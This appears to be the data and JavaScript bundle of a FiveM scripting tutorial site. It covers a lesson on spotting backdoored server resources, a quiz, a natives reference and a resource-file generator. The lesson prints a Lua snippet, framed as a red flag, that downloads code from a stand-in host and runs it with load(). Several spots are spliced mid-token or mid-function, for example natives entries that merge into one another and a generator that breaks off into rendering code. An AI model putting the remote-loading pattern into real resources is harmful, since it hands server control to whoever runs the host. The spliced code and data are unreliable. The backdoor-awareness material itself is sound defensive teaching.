"Spotting backdoored resources","parts":[{"t":"html","h":"\u003cp>A \u003cstrong>backdoor\u003c/strong> is hidden code in a resource (often a leaked or \"free\" paid script) that lets someone else run commands on your server, give themselves admin, or steal your database. Warning signs:\u003c/p>\n\u003cul>\u003cli>\u003cstrong>Remote code loading.\u003c/strong> \u003ccode>PerformHttpRequest\u003c/code> that downloads text and then runs it with \u003ccode>load(...)\u003c/code>, \u003ccode>assert(load(...))()\u003c/code> or, in JS, \u003ccode>eval\u003c/code> / \u003ccode>new Function\u003c/code>. A real script almost never needs to run code downloaded at runtime.\u003c/li>\u003cli>\u003cstrong>Obfuscation.\u003c/strong> Long strings of escape codes (\u003ccode>\"\\x50\\x65...\"\u003c/code> or \u003ccode>\"\\80\\101...\"\u003c/code>), huge \u003ccode>string.char(...)\u003c/code> calls, base64 blobs, variable names like \u003ccode>_0x3f2a\u003c/code>, or one gigantic line of unreadable code in a resource that is not escrowed by its author.\u003c/li>\u003cli>\u003cstrong>Files that do not belong.\u003c/strong> A \u003ccode>.js\u003c/code> file in a Lua-only resource, a server script with a generic name (\u003ccode>sv_utils.lua\u003c/code>, \u003ccode>version.lua\u003c/code>) that is not mentioned in the docs, or a manifest glob like \u003ccode>'**/*.lua'\u003c/code> that quietly loads it.\u003c/li>\u003cli>\u003cstrong>Sending your secrets out.\u003c/strong> Code that reads convars (license key, RCON password, database connection string) or player identifiers and sends them to a URL or Discord webhook.\u003c/li>\u003cli>\u003cstrong>Mystery net events.\u003c/strong> \u003ccode>RegisterNetEvent\u003c/code> handlers with odd names that run whatever text they receive, or that give admin/money with no checks.\u003c/li>\u003c/ul>\n\u003cp>This illustration (with a fake domain) shows the shape to look for. Do not run it:\u003c/p>"},{"t":"code","lang":"lua","file":"server.lua","code":"-- RED FLAG: downloads text from the internet and executes it as code\nPerformHttpRequest('https://example.invalid/payload', function(status, body)\n    if body then load(body)() end\nend)"},{"t":"html","h":"\u003cp>\u003ccode>PerformHttpRequest\u003c/code> by itself is fine (version checks, webhooks for logs). The danger is \u003cstrong>downloaded text being executed\u003c/strong>.\u003c/p>"}]},{"title":"If you find one","parts":[{"t":"html","h":"\u003col>\u003cli>Stop the resource and remove it from \u003ccode>server.cfg\u003c/code>.\u003c/li>\u003cli>Search \u003cstrong>all\u003c/strong> your resources for the same pattern; backdoors often copy themselves into other resources.\u003c/li>\u003cli>Change your RCON password, database password, license key and any webhook URLs it could have read.\u003c/li>\u003cli>Check your database and ACE config for admins or money you did not add.\u003c/li>\u003cli>Replace the script with a clean copy from the original author, and test new resources on a separate test server first.\u003c/li>\u003c/ol>\n\u003cp>Use the scanner below to check a file you are unsure about. It looks for the red flags above; it cannot prove a file is safe, so read anything it flags yourself.\u003c/p>"}]}],"deeper":[{"title":"Server owner options from the docs","parts":[{"t":"html","h":"\u003cp>The docs list some server convars that work with Cfx.re's anti-cheat, enabled by default from FXServer build 8450. Only change them if you know what you are doing:\u003c/p>\n\u003cul>\u003cli>\u003ccode>sv_kick_players_cnl_timeout_sec\u003c/code>, \u003ccode>sv_kick_players_cnl_update_rate_sec\u003c/code>, \u003ccode>sv_kick_players_cnl_consecutive_failures\u003c/code> control kicking players whose connection to Cfx.re's network (\"CnL\") times out. Kicked players see \u003ccode>Connection to CNL timed out.\u003c/code>\u003c/li>\u003cli>\u003ccode>sv_pure_verify_client_settings\u003c/code> verifies client settings like pure level.\u003c/li>\u003cli>\u003ccode>sv_authMaxVariance\u003c/code> and \u003ccode>sv_authMinTrust\u003c/code> control how strictly player identifiers are trusted.\u003c/li>\u003cli>\u003ccode>sv_filterRequestControl\u003c/code> can block \u003ccode>REQUEST_CONTROL_EVENT\u003c/code> routing (taking control of other players' entities).\u003c/li>\u003cli>\u003ccode>sv_disableClientReplays\u003c/code> reduces cheating options but disables the Rockstar Editor.\u003c/li>\u003c/ul>"}]}],"framework":[{"t":"html","h":"\u003cp>Framework functions do not make events safe by themselves. \u003ccode>QBCore.Functions.GetPlayer(src).Functions.AddMoney(...)\u003c/code> or \u003ccode>xPlayer.addMoney(...)\u003c/code> will happily add whatever amount you pass. The validation steps in this lesson still apply. Prefer framework callbacks and exports that run on the server, and never accept prices or rewards from the client.\u003c/p>"}],"task":{"title":"Audit one event on your server","parts":[{"t":"html","h":"\u003col>\u003cli>Open a server script from a job or shop on your server and find every \u003ccode>RegisterNetEvent\u003c/code>.\u003c/li>\u003cli>For one event, go through the checklist above and write down which checks are missing.\u003c/li>\u003cli>On your test server, open F8 and imagine you are a cheater: what values would you send? Add the missing checks.\u003c/li>\u003cli>Paste a resource you downloaded recently into the scanner below and look at anything it flags.\u003c/li>\u003c/ol>"}]},"quiz":[{"q":"A client sends \u003ccode>TriggerServerEvent('shop:buy', 'water', 2, 10)\u003c/code>, where 10 is the price. What should the server do with the price?","opts":["Use it, since the client UI shows the same price","Use it only if it is above zero","Ignore it and look up the price on the server","Multiply it by the count"],"why":"Prices, rewards and amounts must come from server-side data. The client only says what it wants.","answer":2},{"q":"Which of these is the strongest sign of a backdoor?","opts":["A resource uses PerformHttpRequest to check for updates","A resource has a config.lua","Text downloaded with PerformHttpRequest is passed to load() and executed","A resource uses state bags"],"why":"Running downloaded code lets whoever controls that URL run anything on your server.","answer":2},{"q":"How should a server event for an admin teleport check permissions?","opts":["Hide the button in the NUI for non-admins","Check a value the client sends, like isAdmin = true","Call IsPlayerAceAllowed(src, 'myresource.admin') on the server","Use AddEventHandler instead of RegisterNetEvent"],"why":"Only a server-side permission check counts. UI hiding and client values can be faked.","answer":2}],"summary":"Cheaters can trigger any event with any values. Validate everything on the server, use permissions, and learn the warning signs of a backdoored resource."}],"natives":[{"n":"CreateThread","s":"both","c":"Threads & timing","d":"Start a function that runs alongside other code (alias of Citizen.CreateThread).","e":"CreateThread(function() while true do Wait(0) end end)","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/Citizen.CreateThread/","rt":1},{"n":"Wait","s":"both","c":"Threads & timing","d":"Pause the current thread for N milliseconds; Wait(0) waits one frame (alias of Citizen.Wait).","e":"Wait(500)","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/Citizen.Wait/","rt":1},{"n":"Citizen.SetTimeout","s":"both","c":"Threads & timing","d":"Run a function once after a delay in milliseconds.","e":"Citizen.SetTimeout(5000, function() print('5s later') end)","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/Citizen.SetTimeout/","rt":1},{"n":"GetGameTimer","s":"both","c":"Threads & timing","d":"Milliseconds since the game/server started. Good for cooldowns and timers.","e":"local now = GetGameTimer()","u":"https://docs.fivem.net/natives/?_0x9CD27B0045628463","sig":{"client":"int GetGameTimer()","server":"long GetGameTimer()"},"up":"GET_GAME_TIMER"},{"n":"AddEventHandler","s":"both","c":"Events","d":"Listen for an event triggered on the same side.","e":"AddEventHandler('onResourceStart', function(res) end)","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/AddEventHandler/","rt":1},{"n":"RegisterNetEvent","s":"both","c":"Events","d":"Allow an event to be triggered from the other side, and optionally attach its handler.","e":"RegisterNetEvent('shop:buy', function(item) local src = source end)","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/RegisterNetEvent/","rt":1},{"n":"TriggerEvent","s":"both","c":"Events","d":"Trigger a local event (same side). Returns true in Lua if a handler canceled it.","e":"TriggerEvent('chat:addMessage', { args = { 'Hi' } })","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/TriggerEvent/","rt":1},{"n":"TriggerServerEvent","s":"client","c":"Events","d":"Send an event from a client to the server.","e":"TriggerServerEvent('shop:buy', 'water', 2)","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/TriggerServerEvent/","rt":1},{"n":"TriggerClientEvent","s":"server","c":"Events","d":"Send an event from the server to one player, or -1 for everyone.","e":"TriggerClientEvent('chat:addMessage', src, { args = { 'Hi' } })","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/TriggerClientEvent/","rt":1},{"n":"TriggerLatentServerEvent","s":"client","c":"Events","d":"Send a large payload to the server gradually (bytes per second).","e":"TriggerLatentServerEvent('log:upload', 0, text)","u":"https://docs.fivem.net/docs/scripting-manual/working-with-events/triggering-events/","rt":1},{"n":"TriggerLatentClientEvent","s":"server","c":"Events","d":"Send a large payload to a client gradually (bytes per second).","e":"TriggerLatentClientEvent('data:big', src, 50000, tbl)","u":"https://docs.fivem.net/docs/scripting-manual/working-with-events/triggering-events/","rt":1},{"n":"CancelEvent","s":"both","c":"Events","d":"Cancel the local event being handled (other handlers still run).","e":"CancelEvent()","u":"https://docs.fivem.net/natives/?_0xFA29D35D","sig":{"shared":"void CancelEvent()"},"up":"CANCEL_EVENT"},{"n":"WasEventCanceled","s":"both","c":"Events","d":"Check whether the last local event you triggered was canceled.","e":"if WasEventCanceled() then end","u":"https://docs.fivem.net/natives/?_0x58382A19","sig":{"shared":"BOOL WasEventCanceled()"},"up":"WAS_EVENT_CANCELED"},{"n":"RegisterCommand","s":"both","c":"Commands & keys","d":"Create a chat/console command. Third argument true = restricted to the command.name ACE.","e":"RegisterCommand('car', function(source, args) end, false)","u":"https://docs.fivem.net/natives/?_0x5FA79B0F","sig":{"shared":"void RegisterCommand(char* commandName, func handler, BOOL restricted)"},"up":"REGISTER_COMMAND"},{"n":"ExecuteCommand","s":"both","c":"Commands & keys","d":"Run a console command string as if typed.","e":"ExecuteCommand('ensure hello')","u":"https://docs.fivem.net/natives/?_0x561C060B","sig":{"shared":"void ExecuteCommand(char* commandString)"},"up":"EXECUTE_COMMAND"},{"n":"RegisterKeyMapping","s":"client","c":"Commands & keys","d":"Bind a command to a key players can rebind in Settings > Key Bindings > FiveM.","e":"RegisterKeyMapping('+handsup', 'Hands Up', 'keyboard', 'i')","u":"https://docs.fivem.net/natives/?_0xD7664FD1","sig":{"client":"void RegisterKeyMapping(char* commandString, char* description, char* defaultMapper, char* defaultParameter)"},"up":"REGISTER_KEY_MAPPING"},{"n":"IsControlJustPressed","s":"client","c":"Commands & keys","d":"True on the frame a control was pressed (38 = E). Check every frame.","e":"if IsControlJustPressed(0, 38) then end","u":"https://docs.fivem.net/natives/?_0x580417101DDB492F","sig":{"client":"BOOL IsControlJustPressed(int padIndex, int control)"},"up":"IS_CONTROL_JUST_PRESSED"},{"n":"IsControlJustReleased","s":"client","c":"Commands & keys","d":"True on the frame a control was released.","e":"if IsControlJustReleased(0, 38) then end","u":"https://docs.fivem.net/natives/?_0x50F940259D3841E6","sig":{"client":"BOOL IsControlJustReleased(int padIndex, int control)"},"up":"IS_CONTROL_JUST_RELEASED"},{"n":"DisableControlAction","s":"client","c":"Commands & keys","d":"Block a control for this frame (call every frame).","e":"DisableControlAction(0, 24, true) -- attack","u":"https://docs.fivem.net/natives/?_0xFE99B66D079CF6BC","sig":{"client":"void DisableControlAction(int padIndex, int control, BOOL disable)"},"up":"DISABLE_CONTROL_ACTION"},{"n":"PlayerPedId","s":"client","c":"Player","d":"The local player's ped (character).","e":"local ped = PlayerPedId()","u":"https://docs.fivem.net/natives/?_0xD80958FC74E988A6","sig":{"client":"Ped PlayerPedId()"},"up":"PLAYER_PED_ID"},{"n":"PlayerId","s":"client","c":"Player","d":"The local player's player index.","e":"local me = PlayerId()","u":"https://docs.fivem.net/natives/?_0x4F8644AF03D0E0D6","sig":{"client":"Player PlayerId()"},"up":"PLAYER_ID"},{"n":"GetPlayerServerId","s":"client","c":"Player","d":"Convert a client player index into a server ID.","e":"GetPlayerServerId(PlayerId())","u":"https://docs.fivem.net/natives/?_0x4D97BCC7","sig":{"client":"int GetPlayerServerId(Player player)"},"up":"GET_PLAYER_SERVER_ID"},{"n":"GetPlayerFromServerId","s":"client","c":"Player","d":"Convert a server ID into a local player index (-1 if not in scope).","e":"local player = GetPlayerFromServerId(id)","u":"https://docs.fivem.net/natives/?_0x344EA166","sig":{"client":"Player GetPlayerFromServerId(int serverId)"},"up":"GET_PLAYER_FROM_SERVER_ID"},{"n":"GetActivePlayers","s":"client","c":"Player","d":"Table of player indexes known to this client.","e":"for _, player in ipairs(GetActivePlayers()) do end","u":"https://docs.fivem.net/natives/?_0xCF143FB9","sig":{"client":"object GetActivePlayers()"},"up":"GET_ACTIVE_PLAYERS"},{"n":"GetPlayerPed","s":"both","c":"Player","d":"Get a player's ped. Client: player index. Server: server ID.","e":"local ped = GetPlayerPed(src)","u":"https://docs.fivem.net/natives/?_0x43A66C31C68491C0","sig":{"client":"Ped GetPlayerPed(Player playerId)","server":"Entity GetPlayerPed(char* playerSrc)"},"up":"GET_PLAYER_PED"},{"n":"GetPlayerName","s":"both","c":"Player","d":"A player's name. Client: player index. Server: server ID.","e":"GetPlayerName(src)","u":"https://docs.fivem.net/natives/?_0x6D0DE6A7B5DA71F8","sig":{"client":"char* GetPlayerName(Player player)","server":"char* GetPlayerName(char* playerSrc)"},"up":"GET_PLAYER_NAME"},{"n":"GetPlayers","s":"server","c":"Player","d":"Table of all connected players' server IDs (as strings).","e":"for _, id in ipairs(GetPlayers()) do end","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/GetPlayers/","rt":1},{"n":"GetPlayerIdentifiers","s":"server","c":"Player","d":"Table of all identifiers (license, discord, fivem...) for a player.","e":"local ids = GetPlayerIdentifiers(src)","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/GetPlayerIdentifiers/","rt":1},{"n":"GetPlayerIdentifierByType","s":"server","c":"Player","d":"One identifier by type, e.g. 'license'. The usual way to save player data.","e":"GetPlayerIdentifierByType(src, 'license')","u":"https://docs.fivem.net/natives/?_0xA61C8FC6","sig":{"server":"char* GetPlayerIdentifierByType(char* playerSrc, char* identifierType)"},"up":"GET_PLAYER_IDENTIFIER_BY_TYPE"},{"n":"GetPlayerPing","s":"server","c":"Player","d":"A player's ping in ms.","e":"GetPlayerPing(src)","u":"https://docs.fivem.net/natives/?_0xFF1290D4","sig":{"server":"int GetPlayerPing(char* playerSrc)"},"up":"GET_PLAYER_PING"},{"n":"DropPlayer","s":"server","c":"Player","d":"Kick a player with a reason.","e":"DropPlayer(src, 'Kicked by staff')","u":"https://docs.fivem.net/natives/?_0xBA0613E1","sig":{"server":"void DropPlayer(char* playerSrc, char* reason)"},"up":"DROP_PLAYER"},{"n":"IsPlayerAceAllowed","s":"server","c":"Permissions","d":"Check if a player has an ACE permission. Use for every admin event.","e":"if IsPlayerAceAllowed(src, 'myres.admin') then end","u":"https://docs.fivem.net/natives/?_0xDEDAE23D","sig":{"server":"BOOL IsPlayerAceAllowed(char* playerSrc, char* object)"},"up":"IS_PLAYER_ACE_ALLOWED"},{"n":"IsAceAllowed","s":"both","c":"Permissions","d":"Check an ACE for the current context (the local player on the client).","e":"IsAceAllowed('command.car')","u":"https://docs.fivem.net/natives/?_0x7EBB9929","sig":{"shared":"BOOL IsAceAllowed(char* object)"},"up":"IS_ACE_ALLOWED"},{"n":"GetEntityCoords","s":"both","c":"Entity","d":"Position of an entity as a vector3. Works on the server too (OneSync).","e":"local pos = GetEntityCoords(ped)","u":"https://docs.fivem.net/natives/?_0x3FEF770D40960D5A","sig":{"client":"Vector3 GetEntityCoords(Entity entity, BOOL alive)","server":"Vector3 GetEntityCoords(Entity entity)"},"up":"GET_ENTITY_COORDS"},{"n":"SetEntityCoords","s":"both","c":"Entity","d":"Teleport an entity.","e":"SetEntityCoords(ped, x, y, z, false, false, false, false)","u":"https://docs.fivem.net/natives/?_0x06843DA7060A026B","sig":{"client":"void SetEntityCoords(Entity entity, float xPos, float yPos, float zPos, BOOL alive, BOOL deadFlag, BOOL ragdollFlag, BOOL clearArea)","server":"void SetEntityCoords(Entity entity, float xPos, float yPos, float zPos, BOOL alive, BOOL deadFlag, BOOL ragdollFlag, BOOL clearArea)"},"up":"SET_ENTITY_COORDS"},{"n":"GetEntityHeading","s":"both","c":"Entity","d":"Direction an entity faces, 0 to 360.","e":"GetEntityHeading(ped)","u":"https://docs.fivem.net/natives/?_0xE83D4F9BA2A38914","sig":{"client":"float GetEntityHeading(Entity entity)","server":"float GetEntityHeading(Entity entity)"},"up":"GET_ENTITY_HEADING"},{"n":"SetEntityHeading","s":"both","c":"Entity","d":"Set the direction an entity faces.","e":"SetEntityHeading(ped, 90.0)","u":"https://docs.fivem.net/natives/?_0x8E2530AA8ADA9 formMovieFullscreen(sf, 255, 255, 255, 255, 0)","u":"https://docs.fivem.net/natives/?_0x0DF606929C105BE1","sig":{"client":"void DrawScaleformMovieFullscreen(int scaleform, int red, int green, int blue, int alpha, int unk)"},"up":"DRAW_SCALEFORM_MOVIE_FULLSCREEN"},{"n":"SetNuiFocus","s":"client","c":"NUI","d":"Give the NUI page keyboard and/or mouse focus. Always reset to false, false.","e":"SetNuiFocus(true, true)","u":"https://docs.fivem.net/natives/?_0x5B98AE30","sig":{"client":"void SetNuiFocus(BOOL hasFocus, BOOL hasCursor)"},"up":"SET_NUI_FOCUS"},{"n":"SendNUIMessage","s":"client","c":"NUI","d":"Send a Lua table to your NUI page (JSON-encoded for you).","e":"SendNUIMessage({ type = 'open' })","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/SendNUIMessage/","rt":1},{"n":"RegisterNuiCallback","s":"client","c":"NUI","d":"Handle a fetch() from your NUI page. Always call cb.","e":"RegisterNuiCallback('close', function(data, cb) cb({ ok = true }) end)","u":"https://docs.fivem.net/natives/?_0xC59B980C","sig":{"client":"void RegisterNuiCallback(char* callbackType, func callback)"},"up":"REGISTER_NUI_CALLBACK"},{"n":"GetCurrentResourceName","s":"both","c":"Resources & data","d":"The name of the resource this script is in.","e":"GetCurrentResourceName()","u":"https://docs.fivem.net/natives/?_0xE5E9EBBB","sig":{"shared":"char* GetCurrentResourceName()"},"up":"GET_CURRENT_RESOURCE_NAME"},{"n":"GetResourceState","s":"both","c":"Resources & data","d":"'started', 'stopped', 'missing'... of any resource.","e":"GetResourceState('qb-core') == 'started'","u":"https://docs.fivem.net/natives/?_0x4039B485","sig":{"shared":"char* GetResourceState(char* resourceName)"},"up":"GET_RESOURCE_STATE"},{"n":"GetInvokingResource","s":"both","c":"Resources & data","d":"Which resource called your export/event (nil if your own).","e":"local caller = GetInvokingResource()","u":"https://docs.fivem.net/natives/?_0x4D52FE5B","sig":{"shared":"char* GetInvokingResource()"}, hared":"int GetConvarInt(char* varName, int default_)"},"up":"GET_CONVAR_INT"},{"n":"PerformHttpRequest","s":"server","c":"Resources & data","d":"Make an HTTP request. Fine for webhooks; never load() what it returns.","e":"PerformHttpRequest(url, function(status, body, headers) end, 'GET')","u":"https://docs.fivem.net/docs/scripting-reference/runtimes/lua/functions/PerformHttpRequest/","rt":1}]};
/* Resource generator: builds every file for a standalone FiveM resource. Pure function, no DOM. */
function generateResource(o) {
  var name = o.name;
  var useConfig = !!o.config, nui = !!o.nui, cooldown = !!o.cooldown, marker = !!o.marker;
  var luaStr = function (s) { return String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/[\r\n]+/g, ' '); };
  var title = o.title || name.replace(/[_-]+/g, ' ').replace(/\b\w/g, function (c) { return c.toUpperCase(); });
  var helpKey = name.toUpperCase().replace(/[^A-Z0-9]/g, '_') + '_HELP';
  var ev = name + ':server:use';

  // value names: Config.X when there is a shared config, local constants otherwise
  var K = useConfig
    ? { loc: 'Config.Location', md: 'Config.MarkerDistance', id: 'Config.InteractDistance', cd: 'Config.Cooldown', opts: 'Config.Options', title: 'Config.Title' }
    : { loc: 'LOCATION', md: 'MARKER_DISTANCE', id: 'INTERACT_DISTANCE', cd: 'COOLDOWN_SECONDS', opts: 'OPTIONS', title: 'MENU_TITLE' };

  var optionLines = [
    "{ id = 'water', label = 'Water', price = 5 },",
    "{ id = 'sandwich', label = 'Sandwich', price = 8 },",
    "{ id = 'coffee', label = 'Coffee', price = 4 },"
  ];
  var indent = function (lines, pad) { return lines.map(function (l) { return l ? pad + l : l; }); };

  var files = [];

  // ---------- fxmanifest.lua ----------
  var m = [
    "fx_version 'cerulean'",
    "game 'gta5'",
    '',
    "author '" + luaStr(o.author || 'You') + "'",
    "description '" + luaStr(o.description || 'Generated with FiveM Script Garage') + "'",
    "version '1.0.0'",
    ''
  ];
  if (useConfig) m.push("shared_script 'config.lua'   -- loaded on client AND server");
  m.push("client_script 'client.lua'");
  m.push("server_script 'server.lua'");
  if (nui) {
    m.push('', "ui_page 'html/index.html'", '', '-- every file the NUI page needs must be listed here', 'files {',
      "    'html/index.html',", "    'html/style.css',", "    'html/app.js'", '}');
  }
  files.push({ path: 'fxmanifest.lua', lang: 'lua', content: m.join('\n') + '\n' });

  // ---------- config.lua ----------
  if (useConfig) {
    var c = ['Config = {}', ''];
    c.push("Config.Title = '" + luaStr(title) + "'");
    if (marker) {
      c.push('', '-- Where the marker sits. Stand on the spot in game and run /' + name + '_coords to get yours.',
        'Config.Location = vector3(25.7, -1347.3, 29.5)',
        'Config.MarkerDistance = 15.0   -- the marker is drawn within this range',
        'Config.InteractDistance = 1.5  -- "press E" works within this range');
    }
    if (cooldown) c.push('', '-- Seconds a player must wait between uses (enforced on the server)', 'Config.Cooldown = 10');
    if (nui) {
      c.push('', '-- Menu options. The server reads prices from HERE, never from the client.', 'Config.Options = {');
      c = c.concat(indent(optionLines, '    '), ['}']);
    }
    files.push({ path: 'config.lua', lang: 'lua', content: c.join('\n') + '\n' });
  }

  // ---------- client.lua ----------
  var cl = ['-- ' + name + ' / client.lua', '-- Runs on every player\'s PC. Never decide money, items or rewards here.', ''];
  if (!useConfig) {
    var consts = [];
    if (nui) consts.push("local MENU_TITLE = '" + luaStr(title) + "'", 'local OPTIONS = {', ...indent(optionLines, '    '), '}');
    if (marker) consts.push('local LOCATION = vector3(25.7, -1347.3, 29.5)', 'local MARKER_DISTANCE = 15.0', 'local INTERACT_DISTANCE = 1.5');
    if (consts.length) cl = cl.concat(consts, ['']);
  }
  if (nui) {
    cl.push(
      'local menuOpen = false',
      '',
      'local function openMenu()',
      '    if menuOpen then return end',
      '    menuOpen = true',
      '    SetNuiFocus(true, true)',
      '    SendNUIMessage({ action = \'open\', title = ' + K.title + ', options = ' + K.opts + ' })',
      'end',
      '',
      'local function closeMenu()',
      '    menuOpen = false',
      '    SetNuiFocus(false, false)',
      '    SendNUIMessage({ action = \'close\' })',
      'end',
      '',
      '-- The page asks to close (close button or Escape)',
      "RegisterNuiCallback('close', function(_, cb)",
      '    closeMenu()',
      '    cb({ ok = true }) -- always answer, or the page\'s fetch times out',
      'end)',
      '',
      '-- The page sends the option the player clicked',
      "RegisterNuiCallback('select', function(data, cb)",
      '    closeMenu()',
      '    if type(data) == \'table\' and type(data.id) == \'string\' then',
      '        -- only send WHAT they picked; the server looks up the price itself',
      "        TriggerServerEvent('" + ev + "', data.id)",
      '    end',
      '    cb({ ok = true })',
      'end)',
      '',
      '-- Never leave the cursor stuck if the resource restarts while the menu is open',
      "AddEventHandler('onResourceStop', function(resourceName)",
      '    if resourceName == GetCurrentResourceName() and menuOpen then',
      '        SetNuiFocus(false, false)',
      '    end',
      'end)',
      ''
    );
  }
  cl.push('local function interact()');
  if (nui) cl.push('    openMenu()');
  else cl.push("    TriggerServerEvent('" + ev + "')");
  cl.push('end', '');

  if (marker) {
    cl.push(
      "AddTextEntry('" + helpKey + "', 'Press ~INPUT_CONTEXT~ to " + (nui ? 'open the menu' : 'interact') + "')",
      '',
      'CreateThread(function()',
      '    while true do',
      '        local sleep = 1000 -- far away: check once per second to save CPU',
      '        local coords = GetEntityCoords(PlayerPedId())',
      '        local distance = #(coords - ' + K.loc + ')',
      '',
      '        if distance < ' + K.md + ' then',
      '            sleep = 0 -- close by: run every frame so the marker is smooth',
      '            DrawMarker(2, ' + K.loc + '.x, ' + K.loc + '.y, ' + K.loc + '.z,',
      '                0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.3, 0.3, 0.3,',
      '                245, 176, 66, 200, true, true, 2, false, nil, nil, false)',
      '',
      '            if distance < ' + K.id + (nui ? ' and not menuOpen' : '') + ' then',
      "                BeginTextCommandDisplayHelp('" + helpKey + "')",
      '                EndTextCommandDisplayHelp(0, false, false, -1)',
      '',
      '                if IsControlJustReleased(0, 38) then -- 38 = E',
      '                    interact()',
      '                end',
      '            end',
      '        end',
      '',
      '        Wait(sleep)',
      '    end',
      'end)',
      '',
      '-- Helper while setting up: prints your position so you can paste it into the config.',
      '-- Delete this command when you are done.',
      "RegisterCommand('" + name + "_coords', function()",
      '    local pos = GetEntityCoords(PlayerPedId())',
      "    local text = ('vector3(%.2f, %.2f, %.2f)'):format(pos.x, pos.y, pos.z)",
      '    print(text)',
      "    TriggerEvent('chat:addMessage', { args = { '" + luaStr(title) + "', text } })",
      'end, false)'
    );
  } else {
    cl.push(
      '-- No marker selected, so players use a command instead: /' + name,
      "RegisterCommand('" + name + "', function()",
      '    interact()',
      'end, false)'
    );
  }
  files.push({ path: 'client.lua', lang: 'lua', content: cl.join('\n') + '\n' });

  // ---------- server.lua ----------
  var sv = ['-- ' + name + ' / server.lua', '-- The source of trust: validate everything the client sends.', ''];
  if (!useConfig) {
    var sc = [];
    if (nui) sc.push('local OPTIONS = {', ...indent(optionLines, '    '), '}');
    if (marker) sc.push('local LOCATION = vector3(25.7, -1347.3, 29.5)', 'local INTERACT_DISTANCE = 1.5');
    if (cooldown) sc.push('local COOLDOWN_SECONDS = 10');
    if (sc.length) sv = sv.concat(sc, ['']);
  }
  if (cooldown) sv.push('local lastUse = {} -- [serverId] = os.time() of their last use', '');
  sv.push(
    'local function notify(src, message)',
    "    TriggerClientEvent('chat:addMessage', src, {",
    '        color = { 245, 176, 66 },',
    "        args = { '" + luaStr(title) + "', message }",
    '    })',
    'end',
    ''
  );
  if (nui) {
    sv.push(
      'local function findOption(id)',
      '    for _, option in ipairs(' + K.opts + ') do',
      '        if option.id == id then',
      '            return option',
      '        end',
      '    end',
      '    return nil',
      'end',
      ''
    );
  }
  sv.push("RegisterNetEvent('" + ev + "', function(" + (nui ? 'optionId' : '') + ')');
  sv.push('    local src = source -- copy it before anything else');
  if (nui) {
    sv.push(
      '',
      '    -- 1. Whitelist: the option must exist in the SERVER\'s list',
      "    if type(optionId) ~= 'string' then return end",
      '    local option = findOption(optionId)',
      '    if not option then return end'
    );
  }
  if (marker) {
    sv.push(
      '',
      '    -- ' + (nui ? '2' : '1') + '. Distance: is the player really at the marker? (server-side position, needs OneSync)',
      '    local ped = GetPlayerPed(src)',
      '    if #(GetEntityCoords(ped) - ' + K.loc + ') > ' + K.id + ' + 2.0 then',
      "        print(('[" + name + "] %s used it from too far away'):format(GetPlayerName(src)))",
      '        return',
      '    end'
    );
  }
  if (cooldown) {
    var step = 1 + (nui ? 1 : 0) + (marker ? 1 : 0);
    sv.push(
      '',
      '    -- ' + step + '. Cooldown',
      '    local now = os.time()',
      '    if lastUse[src] and now - lastUse[src] < ' + K.cd + ' then',
      "        notify(src, ('Please wait %d more seconds.'):format(math.ceil(" + K.cd + ' - (now - lastUse[src]))))',
      '        return',
      '    end',
      '    lastUse[src] = now'
    );
  }
  if (nui || marker || cooldown) sv.push('', '    -- All checks passed: do the action using values the SERVER decided.');
  else sv.push('', '    -- Add checks here before acting (distance, cooldown, permissions: see the Security lesson).');
  if (nui) {
    sv.push(
      "    notify(src, ('You bought %s for $%d.'):format(option.label, option.price))",
      '',
      '    -- Framework example (uncomment the one you use):',
      "    -- QBCore: local Player = exports['qb-core']:GetCoreObject().Functions.GetPlayer(src)",
      "    --         if Player and Player.Functions.RemoveMoney('cash', option.price) then ... end",
      "    -- ESX:    local xPlayer = exports['es_extended']:getSharedObject().GetPlayerFromId(src)",
      '    --         if xPlayer and xPlayer.getMoney() >= option.price then xPlayer.removeMoney(option.price) ... end'
    );
  } else {
    sv.push(
      "    notify(src, 'It worked! Replace this with your own action.')",
      '',
      '    -- Framework example (uncomment the one you use):',
      "    -- QBCore: local Player = exports['qb-core']:GetCoreObject().Functions.GetPlayer(src)",
      "    -- ESX:    local xPlayer = exports['es_extended']:getSharedObject().GetPlayerFromId(src)"
    );
  }
  sv.push('end)');
  if (cooldown) {

    var deeper = L.deeper.length ? '<section class="block"><h2 class="h">Go deeper</h2><div class="deeper-list">' + L.deeper.map(function (d) {
      return '<details class="deeper"><summary>' + esc(d.title) + '</summary><div class="prose">' + parts(d.parts) + '</div></details>';
    }).join('') + '</div></section>' : '';
    var fw = L.framework ? '<aside class="box"><div class="box-head"><span class="label">framework notes</span><h2>QBCore and ESX</h2></div><div class="box-body prose">' + parts(L.framework) + '</div></aside>' : '';
    var task = '<section class="box"><div class="box-head"><span class="label">try it in game</span><h2>' + esc(L.task.title) + '</h2></div>' +
      '<div class="box-body prose">' + parts(L.task.parts) + '</div>' +
      '<div class="box-foot"><label class="check"><input type="checkbox" id="task-' + L.id + '" data-task="' + L.id + '"' + (progress.tasks[L.id] ? ' checked' : '') + '> Mark task done on my server</label></div></section>';
    var docs = '<section class="block"><h2 class="h">Sources</h2><ul class="sources">' +
      L.docs.map(function (d) { return '<li><a href="' + esc(d.url) + '" target="_blank" rel="noopener">' + esc(d.label) + '</a> <span class="count">' + esc(d.url.replace(/^https?:\/\//, '').split('/')[0]) + '</span></li>'; }).join('') + '</ul></section>';
    var pager = '<nav class="pager" aria-label="Lesson pages">' +
      (prev ? '<a href="#lesson-' + prev.id + '"><small>previous lesson</small>' + esc(prev.title) + '</a>' : '') +
      (next ? '<a class="next" href="#lesson-' + next.id + '"><small>next lesson</small>' + esc(next.title) + '</a>' : '<a class="next" href="#generator"><small>next</small>Resource generator</a>') + '</nav>';
    return '<article class="col">' +
